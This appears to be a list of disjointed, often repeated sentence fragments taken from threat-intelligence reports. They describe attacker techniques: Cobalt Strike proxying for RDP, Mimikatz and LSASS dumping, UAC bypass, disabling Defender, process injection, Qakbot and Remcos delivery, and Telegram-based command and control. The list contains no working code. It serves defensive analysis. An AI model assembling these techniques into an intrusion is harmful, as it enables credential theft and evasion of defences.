HTTP Parent Beacon
customized for the HTTP-POST Block
Encrypting and encoding the data with XOR mask and random key
threat actors use their beacon sessions to establish RDP access
attackers was to establish a Remote Desktop session
to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted
attacker’s Kali Linux host to RDP into our target’s environment
RDP into the target host
Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session
SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon
SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited
the SMB Beacon is communicating over the network with a parent Beacon using named pipes.
can see the named pipe created that we specified on the Cobalt Strike interface when we created the SMB listener.
RDP into the target host using reverse proxy
threat actors using reverse proxy
a reverse proxy
Reverse Proxy using Cobalt Strike Beacon
the ability to run a SOCKS proxy server on the team server.
This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session
attackers take advantage of this technique using proxychains
employ proxychains from the attacker’s Kali Linux host
via reverse proxy.
can be configured as a proxy
threat actors use their beacon sessions to establish RDP access through a reverse proxy
the victim’s hostname is captured in this logon event
execute the command systeminfo on the compromised host.
it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.
which will then send the results to the C2 server
SSL can be used to complicate command-and-control (C2) traffic analysis
replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header
unpack any additional payloads,
HTTPS and other protocols built on SSL have
service using HTTPS
SSL encrypted traffic
TLS encrypted data
detect when TLS connections are being initiated and log the symmetric keys generated for the SSL/TLS connection
decrypt TLS traffic,
decrypt network traffic
decrypted
the decrypted HTTPS traffic.
encrypt
SSL encrypted traffic
TLS encrypted data
downloads the next stage from a public file storage service
embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.
that embeds the Crypter with the payload.
the actor embeds the malicious code inside different legitimate codes.
which enables an HTTPS connection.
Once downloaded and executed, the malicious installer copies its compressed files into a newly created folder with a legitimate-looking name  (i.e., IIS Application Health Monitor) in one of the following directory paths:
At first glance, the files within the directory may seem legitimate
Write a registry Run key
Write a.lnk file in the startup folder
registry run key persistence implementation
The Decryption Shellcode
The Decryption shellcode has three main tasks: first, it extracts the Loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted Loader shellcode.
Decryption shellcode execution flow
The Decryption shellcode
decrypts it using the denoted decryption key
the decrypted payload
the decrypted payload
the decrypted payload address
An encrypted additional shellcode
An encrypted payload
these are encrypted and split inside the XML.
the user will be encouraged to download a malicious installer
deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background.
shellcode is to inject the decrypted payload within the currently running process (itself).
the Loader overwrites the current PE with the final payload’s PE
It does so by copying the PE headers and each section according to the current executable’s base address.
the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER
the import address table and relocation table of the newly injected PE.
the newly injected PE
Loader removes evidence of injection by using the following methods:
Update the LDR data table entry to match the injected PE.
Remove the injected PE headers from memory.
disable system defenses
The process list checked is as follows
The services running on the compromised system are checked against the following list
The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.
the ransomware to deploy additional tools
such as Mimikatz
utilizes a unique onion domain
Encrypted Multi-Hop Proxies
cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection.
have been routinely observed using a VPS as an encrypted proxy.
Some of these nodes operate as part of an encrypted proxy service to prevent attribution by concealing their country of origin and TTPs
cyber actors have been observed using a network of VPSs and small office and home office (SOHO) routers as part of their operational infrastructure to evade detection and host C2 activity
to locate certain files, paths,
cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities.
IP address space
cyber actors have exploited known vulnerabilities in Internet-facing systems
exploit targeting a public-facing appliance vulnerability.
Exploiting Internet accessible webservers using webshell small code injections against multiple code languages, including net, asp, apsx, php, japx, and cfm.
These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device
These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device
after the user clicks on the malicious link or opens the attachment.
the user clicks on the malicious link or opens the attachment.
gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks.
cyber actors used valid accounts to log into a service specifically designed to accept remote connections,
The actor may then perform actions as the logged-on user.
cyber actors used valid accounts to log into a service specifically designed to accept remote connections,
The actor may then perform actions as the logged-on user.
Using cmd.exe,
Windows Command Shell
or command line interface tools
executing malware shellcode and batch files
Employing Python scripts to exploit vulnerable servers.
cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks.
to establish new services to enable persistence.
cyber actors have also been observed modifying group policies for password exploitation.
usage of Mimikatz
observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping.
Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement.
Using shellcode that injects implants into newly created instances of the Service Host process (svchost)
were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device.
cyber actors have been observed deleting files using rm or del commands.
cyber actors were observed Base64 encoding files and command strings to evade security measures.
have been observed using Base-64 encoded commands
were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads.
have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.
cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.
cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.
cyber actors used RDP
cyber actors have been observed using the mv command to export files into a location
a downloader that downloads and executes a payload
cyber actors have been observed importing tools from GitHub or infected domains to victim networks
cyber actors used the Server Message Block (SMB) protocol to import tools into victim networks.
it also tries to delete the wp-sale.js file
obfuscated PHP code (again using character code obfuscation):
a heavily obfuscated script
obfuscated JavaScript code
When decoded
When decoded, a backdoor is revealed
sent as a POST request
This backdoor executes arbitrary PHP code sent in POST request parameters.
actors disable antivirus software
the threat actor deactivated antivirus protocols
after receiving phishing emails containing malicious PDF documents [T
for initial access is RDP compromise.
actors often use RDP to move laterally across the network
download multiple tools 
actors gain initial access through exploiting public-facing applications 
PsExec has also been used to aid lateral movement
actors used a legitimate admin account to remotely log on to the domain controller
by modifying Group Policy Objects
force a group policy update
delete files upon completion—including
numerous batch (.bat) files on impacted systems
Batch files create a new admin user 
which are typically transferred as an encrypted 7zip file.
These strings are passed to a decoding function where they are converted from hex to byte and XOR’d with decimal 18.
the decoded strings
Once decoded
Base64 decodes the payload content
to decode the second buffer using key 58 3E 88 D0
decoded by Shellcode
These strings are passed to a
de-obfuscation function
PowerShell de-obfuscation routine
this shellcode is responsible for fetching Remcos RAT
used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers
retrieves a decoy tax document and VBS script.
copying the current process command line as a new argument
full command line argument
a single payload
package is retrieved that contains both the two-stage shellcode
highly obfuscated commands and encrypted shellcode.
The PowerShell command contains various obfuscated strings
inject Remcos RAT into a legitimate Windows process such as ieinstal.exe.
injecting it into ieinstall.exe
execution begins with the user clicking on a shortcut file
executed by the user clicking a shortcut file
enticing users to click on malicious shortcut files
checks if the system is 64-bit
remote access and surveillance features
keylogging
screenshots
highly obfuscated and contains junk code to impede analysis.
The script concatenates hundreds of smaller strings into a single variable which ultimately builds and executes
The payload would then be decrypted through XOR
use a set of tools via remote desktop
the ransomware drops a batch file
to steal system information like machine details
the payload most likely arrives by exploiting public-facing websites and domains.
targeted vulnerabilities in Microsoft SQL (MS SQL) Server for initial access
the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&amp;C) server
used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.
to terminate security-related processes and services by dropping KILLAV
the threat actors who perform brute-force attacks on MS SQL Servers.
executed a spam campaign with malicious OneNote file attachments,
The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers
The malware implemented a series of Mimikatz modifications on closed-source tooling
staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities
In order to steal credentials, the attackers employ custom modified versions of Mimikatz
stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.
Mimikatz publicly available code (top); strings from a Mimikatz modification
This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.
accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file
of a Security Package into LSASS using RPC calls.
steals credentials from LSASS
The threat actors used C:\MS_DATA as their main working directory for storing malware and staging data for exfiltration
and Remote Desktop user sessions.
cmd  /c
cmd"  /c
cmd"  /c
cmd"  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
cmd  /c
They also retrieve networking information, like network adapters, specific machines, and network services like  Remote Desktop Protocol (RDP).
For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines.
and the PsExec Windows Sysinternals tool and net for lateral movement and exploration
loads and executes the decrypted
pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm
pc.dll decrypts,
Disabling Windows event logging in an attempt to evade detection
In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself
Injecting pc.dll into LSASS as a Security Package
to execute malicious code in the context of LSASS.
enumerating the processes’ threads,
tasklist
informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package
embedded JavaScript Observed Notation (JSON)-based configuration to set parameters
text-encoded in base64
brute-force attacks
brute-forcing and compromising servers
Valid credentials
uploaded to the command-and-control (C&amp;C) server,
usually at port 5028/TCP
use several highly obfuscated and underdevelopment custom loaders
malicious RAR archive
exploits CVE-2015-2291, an Intel driver vulnerability, to load a malicious driver designed to reduce the token integrity of Microsoft Defender.
deploying a malicious kernel mode driver (“bring your own vulnerable driver” or BYOVD method) via exploiting a vulnerable Intel driver
install an information stealer.
stealer,
keylogger with logging capabilities using the Telegram API
distributed to victims via phishing attempts
embedded binary files
archive contains the files,
deobfuscate, decompress,
decrypts strings
deobfuscation, and decompression
decompressing
decompresses it using the GZipStream API,
masquerades as a legitimate word document
legitimize the package in the eyes of the victim
designed to lure unsuspecting victims into executing the loader.
is executed by the victim
utilizes Telegram for delivering payloads
download
used to send program execution DEBUG and Telegram to deliver payloads and send commands.
downloads the next part
utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat.
send commands.
sends a request to the attacker-controlled Telegram channel
sends the message "bot getted" to the debug server.
accepts commands from a Telegram channel,
message to both the Debug server and the Telegram channel,
sends a GET request to  https://api[.]telegram[.]org/bot{token}/getUpdates to retrieve the command
API hashing
resolves hashed Windows APIs
conceal the utilization of potentially suspicious APIs (functions) from static detection
replacing the human-readable names of functions (such as "CreateMutexW") with a hash value,
used in the code to call the corresponding API function
employs dynamic API resolving to conceal its API imports
storing the names or hashes of the APIs needed, then importing them dynamically at runtime.
passes two arguments to the "mw_resolveAPI" function.
resolves the given API hash and retrieves the address of an exported function
creating a hash for each export function name
string encryption,
irrelevant code
LoadLibrary and GetProcAddress functions
Compressapi
GetTokenInformation API.
retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key
retrieves the MachineGuid of the infected system from the "SOFTWARE\Microsoft\Cryptography\MachineGuid" registry key.
deletes the HKCU\SOFTWARE\Intel registry key and recreates it
collects information about the .NET Framework Setup
elevate its privileges by executing the mw_UAC_bypass function
Calling Local Windows RPC Servers from .NET
bypass user account control (UAC) using only two remote procedure call (RPC) requests
executes an export function called "Entry" from UpdateTask.dll via rundll32.exe
payload through rundll32.exe
disable Microsoft Defender
patch the integrity level of the Microsoft defender (MsMpEng.exe) and forcibly reduce it from system to untrusted integrity.
determine if it is running as an account with administrator privileges or simply as a regular user
creating scheduled tasks
sets up its working directory
collect system information and steals user information
tokens, and passwords from various web browsers and applications
captures screenshots
compressed and exfiltrated to the attacker via Telegram
some strings, such as web browser paths and Geolocation API services URLs, are encrypted with the AES algorithm in cipher-block chaining (CBC) mode
gathers basic system information,
for the infected system by gathering the username and hostname
the malware then proceeds to gather basic system information, including username, computer name, and OS version,
System info, including both hardware and OS info.
Collection of information about the system in HTML format
and hostname
gathers basic system information, which it then sends to the C2,
send a list of process names and IDs back to the C2
the system information gathered by Domino Backdoor and sent to the C2
in return receives an AES encrypted payload.
uses a custom algorithm which XOR’s multiple values together.
which is stored immediately before the encrypted config block.
The malware generates a random 32-byte key, which it encrypts using the RSA key.
loading an encrypted payload from its resources
The Microsoft WinCrypt library is used for AES encryption and
the encrypted config.
be based on an encryption algorithm used previously in
by gathering the username and
to gather basic system information, including username,
is generated from the system username
used a similar XOR-based algorithm as part of its encryption mechanisms during communication with the C2.
then proceeds to gather basic system information, including username, computer name, and OS version, which it then encrypts using AES-256-CBC and the generated,
then sends the AES-encrypted system data.
This data is then encrypted using AES and returned to the C2.
the decrypted config contains two pipe-delimited IP addresses
and decrypts them using XOR and the key
The malware then proceeds to decrypt its configuration block,
The config is decrypted using XOR and a 16-byte key
A second config block, which is decrypted separately
The decrypted data consists of a 4 byte size
The malware then decrypts the received payload using AES and the shared key.
which decrypts to the following 5 bytes
decrypting it using AES-256-CBC and a hardcoded key.
The decrypted data consists of 4 bytes containing the payload size,
The Microsoft WinCrypt library is used for AES encryption and decryption by both
is decrypted using XOR and a 16-byte key
executes the decrypted shellcode
loads the resources using the API calls LdrFindResource_U and LdrAccessResource
and execute the file using CreateProcessA.
utilising similar API calls,
the malware enumerates the running processes on the system and compiles a list of process names and IDs.
enumerate running processes and send a list of process names and IDs back to the C2
Enumerates running processes
the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.
It copies the headers, maps the individual PE sections,  processes any relocations,  loads the PE’s imports, and then executes the PE from its internally specified entry point.
passes the PE payload to it, which the shellcode then loads and executes.
Enumerate files on desktop
Enumerates files under Steam application directory
looping through entries under registry key
waits for data collection tasks to complete,
creating a hash of the collected data, to which it then appends its current process id.
uploads data to the C2 via a HTTP POST request
http/https data transfer
Self-delete after sending data
It then attempts to connect to the C2 via TCP port 443
ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service.
Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure.
may use stolen legitimate accounts specified in the configuration data.
uses the command shell to run appropriate commands
an additional BAT file contained in the body of the ransomware.
The attackers may use wmic to obtain information and run various commands,
They may also use the wmiexec module from Impacket to execute commands and move across the network.
uses wmic to obtain the
ransomware uses Native API.
the function CreateProcessWithLogonW.
affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware.
disabling security tools
To prevent being detected, the attackers end processes and services related to security and antivirus software.
To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method.
Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method.
decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility
unpacks the legitimate PsExec utility
ransomware uses obfuscation.
use a SoftPerfect Network Scanner executable renamed to svchost.exe.
uses PsExec to modify the system registry parameter MaxMpxCt
To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll).
To obtain authentication data from the registry and files, the attackers may use NirSoft utilities.
The attackers enumerate drives, directories, and files
to search for sensitive information for exfiltration purposes.
The attackers collect information from the local system for exfiltration purposes.
The attackers may use RDP to move across the network.
uses wmic to obtain the UUID of the compromised host.
enumerates all running processes
;Moving across the victim’s network and deploying ransomware involves copying related tools to the host.
can self-propagate in the network by using the legitimate PsExec utility
to search for ones relating to security
enumerates system services to search for ones relating to security
Before exfiltration, the attackers may put collected data in 7Zip archives.
Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS,
When the attackers use Cobalt Strike, the collected information may be sent via Cobalt Strike server communication channels.
To remotely access the compromised infrastructure, the attackers may use the legitimate tools TeamViewer and ScreenConnect.
To remotely access the compromised infrastructure, the attackers may use Cobalt Strike, TeamViewer and ScreenConnect
which perform asymmetric/symmetric encryption of the C&amp;C server communication channel.
the attackers copy tools necessary for deployment to the compromised host.
the malware executes a command to delete itself from the system
delete key files
attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO)
installs the payload as a service
sets a hardcoded list of system directories
system directories are targeted
enumerates their partitions.
an obfuscated .NET program.
WMI
to identify where the Operative System is stored in the disk
Application-level protocol
sends the output of ipconfig in a POST request
the opening of a URL file extracted from the archive.
output of ipconfig was sent to one of two addresses
Application-level protocol
a GET request is sent to the C2 server.
application-level messages from the server to the client is sent as the body of an HTTP response
are sent using separate POST requests.
sends an HTTPS request
same IP address was used as C2 server
domains give attackers the ability to mask malicious traffic as legitimate activity within the company
HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.
HTTP and HTTPS are supported
HTTP with long polling
connect by sending a GET request to a URL from the configuration and provide a special cookie value
sends GET requests with pull operations.
POST request with push operation
Application-level protocol
use HTTP/HTTPS for C2 connections
An encrypted resume
archive
archive contains a bait PDF document
XOR encrypted with a 16-byte key
obfuscated with VMProtect
additional XOR encryption with the key
AES-128-CBC for encryption.
hashed with MD5
use AES-128 in CFB mode as the encryption algorithm
encrypted with the algorithm
a RAR archive
distributed in a RAR archive
ROR-13 hash
re-encrypted and saved in the same location
encrypted header
encrypted Base64 string containing the session GUID
compressed with GZip prior to encryption
are obfuscated with VMProtect
obfuscated
obfuscated code
is encrypted in the file
is re-encrypted
has been obfuscated with the same rel_jmp and fake-jb techniques
SFX archive
SFX archive
RAR and SFX-RAR files
plus the folder
malicious archive,
located in the data sections
shellcode is located in a PE file overlay.
(encrypted) shellcode
consists of two .exe files.
contains three identical executable files
contains just one file:
which is also embedded inside the CHM file
three sections are extracted
malicious shortcuts
Web lnks with two shortcuts:
copies the payload to the folder C:\Users\Public\Downloads
PDF documents with a CV and IELTS certificate
the folder C:\Users\Public
copied to the folder %appdata%\Microsoft\AddIns\
into the folder c:\programdata
folder c:\programdata
trying to open either of the shortcuts
If the user opens it directly
tries to make users run malicious .lnk, .chm, and .exe files
running a command that extracts a Base64-encoded CAB archive from the body of the LNK file,
archive is unpacked to a temporary folder.
an extracted JS script
extract shellcode
decrypts the string
used for decryption:
is unpacked
unpacks
encrypted portion of the data is decrypted
is decrypted
decryption and decompression
decryption
decodes it into shellcode with Base64
decrypt
uses a custom PL format with encryption
adding itself to the startup folder
writes the file svchost.bat, which transfers control to winness.exe, to the startup folder
persists by means of a registry run key or a startup folder
adding a scheduler task,
creates a task with schtasks for persistence
that all three intermediate C2 servers
possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers
domains give attackers the ability to mask malicious traffic as legitimate activity within the company
proxy server
proxy
– proxy server address and credentials
proxy server
collects and sends system information
OS uptime
Operating system version and whether it is 32-bit or 64-bit
Computer name
Name of running module
PID
Shellcode version and whether it is 32-bit or 64-bit
Whether the OS is 32-bit or 64-bit
Computer name
collect information about the computer name and OS version and whether it is 32-bit or 64-bit
Network adapter IP addresses
MAC address of one of the adapters
List of IP addresses
MAC addresses of network adapters
Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes.
collect information about the IP and MAC addresses of the infected machine
Username
Username and workgroup
collect information about the name of the current user
Transport-level protocol
Standard TCP connection
two TCP connections.
Duplication of socket with TLS connection
establishes a TCP connection
messages are exchanged in the original TCP connection (without TLS encryption).
KCP protocol
uses KCP on top of a TCP connection
three ways to connect to the C2 server
Transport protocol 3, port 8443
Transport protocol 2, port 80
Transport protocol 1, port 8080
TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server
Transport protocols
TCP
RPC (Pipe)
Network-level protocol
KCP protocol
KCP protocol
support for multiple transport protocols for connecting to C2 servers
use TCP and UDP for C2 connections
AES-128 is the encryption algorithm used.
encrypted with AES-256-CBC;
is encrypted in the standard way
encrypted in the backdoor's standard way,
data is encrypted in the standard way
uses AES for encrypting traffic in its backdoors
injectors
run it in an active process
running an arbitrary command in a CHM file via an ActiveX object
runs in a new process
is injected in a similar way
injected into
Crosswalk and Metasploit injectors
inject shellcode into the process
SeDebugPrivilege
finds the API functions it needs
Microsoft CryptoAPI
Cryptography API:
via a ZwCreateSection call
via ZwMapViewOfSection calls
execute a method from the .NET assembly
HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations
RPCConnector and RPCBindConnector
TcpBindConnector and HttpBindConnector
TcpConnector/TcpBindConnector
CreateThread
uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process
finds the PID of the target process
Current processes are checked
Name of running module
PID
injects shellcode into it
injects shellcode into the processes explorer.exe, winlogon.exe, wmplayer.exe, svchost.exe, and spoolsv.exe
archive was distributed
unpacks an HTML
is unpacked from the CHM file.
SFX archive
unpacks three files
contents are unpacked
SFX archiveWhen unpacked
use VMProtect or custom packers for its malware
can send system information
is the library Funny.dll
dynamically loads the library
that contains the library mapistub.dll,
dynamically loaded from a Base64 constant defined in the main assembly.
conditional jumps that never run are included
obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).
the file is deleted
wiping traces of malware from the system
saved in the registry
passes control to a.bat.
cleanup script
uses cmd.exe and .bat files to run commands
sends phishing messages with malicious attachments
persists on infected machines by creating new services
uses legitimate utilities to load DLLs
establish C2 connections via a peer-to-peer network of infected hosts
support C2 connections via an external HTTP/SOCKS proxy
using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.
abusing API calls in the Operating System.
The malware also decrypts
the decryption routine
Decryption routine
the AES 256 decryption key of the payload
strings decoded when running
to decrypt the payload from the .dat file using the AES-256-CTR decryption algorithm and starts to execute.
injects the payload in memory.
The malware was injected into a SVCHOST process where a driver location pointed to the config file
injects it into a process.
a process injection in one of the svchost processes
injected themselves into Windows Media Player
injected code in a process
the adversary had removed the payload file from the system.
Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence
Besides the use of Mimikatz to dump credentials,
acquired through the use of Mimikatz, or creating LSASS dumps,
using Mimikatz and dumping lsass,
Using Mimikatz and dumping of lsass,
makes use of the technique “DLL Sideloading”
When the executable is run, the DLL next to it is loaded.
The dll is run using the command “rundll32.exe
The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.
The DLL embeds several obfuscated strings
was to start a program as a service
The DLL is used to create a malicious service
. The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.
Adversary installed custom backdoor as a service
Adversary launched backdoor and some tools as a Windows Service
the command line dump of the memory:
cmd /c
When running the file from the command line,
In some cases, batch (.bat) scripts were created
content in a batch script:
the exfiltration of data on the system, such as OS, Processor (architecture),
Username
WMI activity [T1546.003] was also observed to execute commands on the systems.
WMI was used for running commands on remote systems
From a persistence point of view, scheduled tasks
Adversary ran scheduled tasks for persistence of certain malware samples
and the use of valid accounts
they were looking to get valid accounts.
the adversary gained credentials in the network
the files were exfiltrated over the backdoor
the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths
malware exfiltrated data towards a C2
When the data was gathered on a local system using the backdoor
and the rar files were deleted
exfiltrated over HTTP using GET requests
HTTP traffic to C2
The packet data was customized and sent through a POST request with several headers towards the C2.
The malware started to open up both UDP and TCP ports to connect with a C2 server
the customized packet size using a XOR value.
Adversary exploited a web-facing server with application
the actor established initial access by compromising the victim’s web server
Tools were transferred to a compromised web-facing server
Adversary browsed several locations to search for the data they were after.
used Rotten/Bad Potato to elevate user rights by abusing API calls in the Operating System.
including adding of registry keys
and lateral movement/execution of files
the attackers would launch a lateral movement phase, using default Windows credentials
run a network recognition process to find the IP address of each of the ATMs
using a variety of encryption schemes and symmetric keys.
to install AnyDesk and provide remote access for the “technician” to install the malware.
All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration
Those files will later be sent to the malware C2 server
Captured data stored in the uploader C2
sending all cab files generated from the stolen transactions to the server
StartSendScreen, StopSendScreen
StartSendScreen
Start screen capture
StopSendScreen
Stop screen capture
Download a file from the remote server
StartDownload, StopDownload.
Shell
Execute a specified command via CMD
the files are sent through an HTTP POST request.
Add the process to a startup registry key
malicious OneNote documents to entice users to click on an embedded file to download and execute
a fake message to lure users to execute the HTA  file 
Upon clicking the Open button, it drops the HTA file
it prompts the user with a fake message to double-click on open to view the attachment.
The message above the ‘Open’ button instructs the user to “double click” in order to receive the attachment.
The malicious document is delivered in either zip files or ISO images to the target through phishing emails.
the malware author used phishing emails to deliver malicious OneNote document either as attachment
Windows batch script
executes a batch file
the batch file
the malicious batch file
Upon execution of the batch file
launched by cmd.exe
batch file
Embedded Executable Objects In OneNote  
an embedded file gets executed by the user
The FileData member of the FileDataStoreObject is the key member that holds the embedded data in the OneNote document.
Embedded data in Data object
OneNote file contains an embedded HTA  attachment
The OneNote file with the embedded HTA file
contains the “whoami” command
make use of  the curl utility to download Qakbot and then execute it.
The HTA file uses curl utility to download
Curl is used to download the malicious DLL file
The script will then execute the downloaded file
downloads the payload from the Internet and executes on the target system.
Powershell will be invoked and it fetch the Qakbot payload from Internet
use powershell to download the payload
executed by rundll32.exe.
The script will then execute the downloaded file with Rundll32.exe
execute it with rundll32.exe
Obfuscated HTA script
The HTA file contains obfuscated script
The obfuscated registry is then read by MSHTA and the obfuscated code is
with obfuscated content
Deobfuscated HTA content
code is de-obfuscated
Base64 Decoded instructions in dropper
The base64 decoded batch file
then deletes the registry key
creates a registry key in HKEY_CURRENT_USER\SOFTWARE\
A closer look at the document reveals the graphical elements are all images placed in a layered style by the malicious actor.
enumerate files and folders
It then performs SQL queries to retrieve files, file size, folders
Many of the hosts used to support these second-stage operations hosted RDP services
can run commands that will download files
web shell with filenames that masquerade as human.aspx, which is a legitimate component of the MOVEit Transfer software.
several POST requests
large volumes of files have been stolen from victims' MOVEit transfer systems.
The threat actors also moved laterally to the domain controller, compromised credentials
implanted Ngrok reverse proxies
The actors used Ngrok to proxy RDP connections and to perform command and control.
the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server
The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.
added an exclusion rule to Windows Defender
added an exclusion rule to Windows Defender.
The actors added an exclusion rule to Windows Defender.
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools
The actors manually disabled Windows Defender via the GUI.
The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans.
manually disabled Windows Defender via the Graphical User Interface (GUI)
The Scheduled Task was named RuntimeBrokerService.exe
created a Scheduled Task
The actors’ exploit payload created Scheduled Task
the actors used RDP
RDP sessions
the actors leveraged RDP to propagate to several hosts within the network.
The actors used RDP to move laterally to multiple hosts on the network.
RDP connections
and the built-in Windows user account DefaultAccount [T1078.001] to move laterally
The actors used built-in Windows user account DefaultAccount.
Mimikatz – a credential theft tool.
The threat actors then executed Mimikatz on VDI-KMS to harvest credentials
the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process
trying to dump LSASS process.
The actors used Mimikatz to harvest credentials.
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain
The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network
The actors downloaded the following tools
to download next stage and execute it
The exploit payload then downloaded mdeploy.text
The actors downloaded malware and multiple tools to the network
as outgoing HTTPS port 443 connections
The actors removed malicious file mde.ps1 from the dis.
removed mde.ps1 from the disk
$BASE64 encoded payload
recording files to be uploaded when their download is requested by the C2 server.
and uploads it back to the server.
uploads it to the C2 server.
sends it to the C2 server.
sends it to the C2 server.
Upload a recording file with a specified name to the C2 server.
data to be exfiltrated to the C2 server
sends data to the C2 server
Sends the shellcode execution results to the C2 server
decrypts the next loader stage
decrypts it
Decrypts
decryption procedure
Decrypts
shellcode decrypts
After decrypting
decrypts the Orchestrator
decodes the directory path
decrypts the hidden page
decrypting them on the fly.
decrypts it with XOR
Decrypts the Trojan with a XOR-based cipher
The decryption key
injects the Trojan loader into exe.
can be injected to processes
The malware injects the ProcessWorm into all processes running on the system
injects itself into processes
injects the ProcessWorm if needed.
injects the ProcessWorm into processes
is injected into all running processes.
injecting code
The injected Trojan loader
collects specific system information
Returns information about the machine’s BIOS.
Returns information about the operating system
computer name
Overall available space
Space available to current user (may be less than overall available space due to quotas)
Disk capacity
Returns information about the computer system
checks if it is running on a 64-bit system
Returns OSVERSIONINFOEXW and SYSTEM_INFO structures
the current process name
Returns the list of running processes
Returns ProcessDebugPort value returned by NtQueryInformationProcess for current process.
Returns ProcessDebugObjectHandle value returned by NtQueryInformationProcess for current process
Returns process names of the current process tree (i.e. the current process, the parent process, the grandparent process, etc.)
obtains the list of processes
extract specific information about running processes
regularly obtains the list of running processes.
examines all the processes on the system
looks for specific processes
acquires handles for all running processes on the system, which results in either winlogon.exe or explorer.exe obtaining numerous process handles.
When it detects a starting first (or a stopping last) instance of a process from the list
running processes
a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code
obfuscated code
obfuscated trampoline in the .text section.
This trampoline is protected with an obfuscator
obfuscated with FinSpy Mutator
This module is an obfuscated shellcode.
obfuscated DLL
obfuscated with FinSpy VM.
It is encrypted with a 256-byte RC4 key.
conceals memory areas that contain the Trojan components’ code and data.
encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them
protected with an obfuscator
An obfuscator similar to OLLVM is used to protect FinSpy
It is obfuscated with a protector resembling the open source OLLVM obfuscator.
The encrypted VFS file.
The setup configuration file, which is encrypted with RC4
an obfuscator resembling OLLVM or both these protectors
a call to the CreateWindowExW
